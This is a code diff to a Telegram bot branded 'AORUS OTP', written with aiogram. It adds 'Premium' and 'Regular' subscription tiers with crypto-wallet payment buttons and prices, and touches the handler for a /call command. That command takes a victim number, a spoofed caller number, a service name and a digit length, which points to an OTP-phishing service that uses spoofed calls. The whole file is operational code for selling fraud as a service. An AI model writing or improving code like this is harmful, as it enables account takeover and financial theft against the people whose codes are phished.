@@ -345,33 +345,15 @@ async def purchase(message: Message):
         keyboard = InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(text="🆘 Support", url=admin_link)
-            ],
-            [
-                InlineKeyboardButton(text="₿ BTC", callback_data="btc")
-            ],
-            [
-                InlineKeyboardButton(text="💲 USDT", callback_data="usdt"),
-                InlineKeyboardButton(text="♢ ETH", callback_data="eth")
-            ],
-            [
-                InlineKeyboardButton(text="𝑳 LTC", callback_data="ltc"),
-                InlineKeyboardButton(text="◎ SOL", callback_data="sol")
+                InlineKeyboardButton(text="🔑 Premium", callback_data="premium"),
+                InlineKeyboardButton(text="🔑 Regular", callback_data="regular")
             ],
             [
                 InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
             ]
         ]
         )
-        await message.answer("""💸 Choose your subscription plan and send it to one of the following wallets bellow\:
-                                     
-  • 1 Hour Plan   ➜ *10$ \(trial mode\)*                                                                   
-  • 1 Day plan    ➜ *25$*
-  • 3 Days plan   ➜ *40$*
-  • 1 Week plan   ➜ *80$*
-  • 1 Month plan  ➜ *220$*
-  • 3 Months plan ➜ *480$*
-  • Premium plan ➜ *45$ \(2 days \+ bot sources\)*""",parse_mode='MarkdownV2',reply_markup=keyboard)
+        await message.answer("""💸 Choose your subscription type:""",reply_markup=keyboard)
 
 
 #PROFILE
@@ -555,7 +537,7 @@ async def send_local_video(message: Message):
                     if now < expire_date:
                         args = message.text.split(maxsplit=4)
                         if len(args)<4:
-                            await message.answer("You have to enter 3 arguments, /call [victim_number] [spoof_number] [service_name] [digitlenght]")
+                            await message.answer("❌ You have to enter 3 arguments, /call [victim_number] [spoof_number] [service_name] [digitlenght]")
                         else:
                             victim=args[1]
                             number=args[2]
@@ -572,13 +554,13 @@ async def send_local_video(message: Message):
                                 else:
                                     await message.answer("❌ You are in trial mode you can't make a call.\nYou have to buy a subscription.",reply_markup=keyboard)
                             elif not(victim.isdecimal() and 6<=len(victim)<=15 and number.isdecimal() and 6<=len(number)<=15):
-                                await message.answer("You have to type a valid phone number.")
+                                await message.answer("❌ You have to type a valid phone number.")
                             elif args[3] not in services:
-                                await message.answer("You have to choose a valid service.\nType /services to check our available services.")
+                                await message.answer("❌ You have to choose a valid service.\nType /services to check our available services.")
                             elif not(args[4].isdecimal()):
-                                await message.answer("The digits must be between 4 and 8")
+                                await message.answer("❌ The digits must be between 4 and 8")
                     else:
-                        await message.answer("Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
+                        await message.answer("❌ Your subscribe was expired.\nYou have to buy a new key.",reply_markup=keyboard1)
             elif get_user_info(user_id,'date') =='N/A':
                 await message.answer("🚫 You didn't subscribe yet.",reply_markup=keyboard1)
         else:
@@ -866,6 +848,61 @@ Join us and be part of the growing *AORUS OTP community*\!""",parse_mode='Markdo
 #PRICES
 @dp.callback_query(F.data.in_(["Purchase"])) #DONE
 async def pricing(callback: CallbackQuery, bot: Bot):
+    user_id = callback.message.from_user.id
+    if not (get_user_info(user_id,'banned')):
+        keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="🔑 Premium", callback_data="premium"),
+                InlineKeyboardButton(text="🔑 Regular", callback_data="regular")
+            ],
+            [
+                InlineKeyboardButton(text="🔙 BACK TO MENU", callback_data="back")
+            ]
+        ]
+        )
+        await callback.message.answer("""💸 Choose your subscription type:""",reply_markup=keyboard)
+
+
+#PREMIUM PRICES
+@dp.callback_query(F.data.in_(["premium"])) #DONE
+async def premium_pricing(callback: CallbackQuery, bot: Bot):
+    user_id = callback.from_user.id
+    if not (get_user_info(user_id,'banned')):
+        keyboard = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [
+                InlineKeyboardButton(text="🆘 Support", url=admin_link)
+            ],
+            [
+                InlineKeyboardButton(text="₿ BTC", callback_data="btc")
+            ],
+            [
+                InlineKeyboardButton(text="💲 USDT", callback_data="usdt"),
+                InlineKeyboardButton(text="♢ ETH", callback_data="eth")
+            ],
+            [
+                InlineKeyboardButton(text="𝑳 LTC", callback_data="ltc"),
+                InlineKeyboardButton(text="◎ SOL", callback_data="sol")
+            ],
+            [
+                InlineKeyboardButton(text="🔙 BACK TO PRICING LIST", callback_data="purchase")
+            ]
+        ]
+        )
+        await callback.message.delete()
+        await callback.message.answer("""💸 Choose your subscription plan and send it to one of the following wallets bellow\:
+                                                                                                       
+  • 1 Day plan    ➜ *45$*
+  • 3 Days plan   ➜ *60$*
+  • 1 Week plan   ➜ *110$*
+  • 1 Month plan  ➜ *350$*
+  • 3 Months plan ➜ *560$*""",parse_mode='MarkdownV2',reply_markup=keyboard)
+
+
+#REGULAR PRICES
+@dp.callback_query(F.data.in_(["regular"])) #DONE
+async def regular_pricing(callback: CallbackQuery, bot: Bot):
     user_id = callback.from_user.id
     if not (get_user_info(user_id,'banned')):
         keyboard = InlineKeyboardMarkup(
@@ -897,8 +934,7 @@ async def pricing(callback: CallbackQuery, bot: Bot):
   • 3 Days plan   ➜ *40$*
   • 1 Week plan   ➜ *80$*
   • 1 Month plan  ➜ *220$*
-  • 3 Months plan ➜ *480$*
-  • Premium plan ➜ *45$ \(2 days \+ bot sources\)*""",parse_mode='MarkdownV2',reply_markup=keyboard)
+  • 3 Months plan ➜ *480$*""",parse_mode='MarkdownV2',reply_markup=keyboard)
 
 
 #BTC
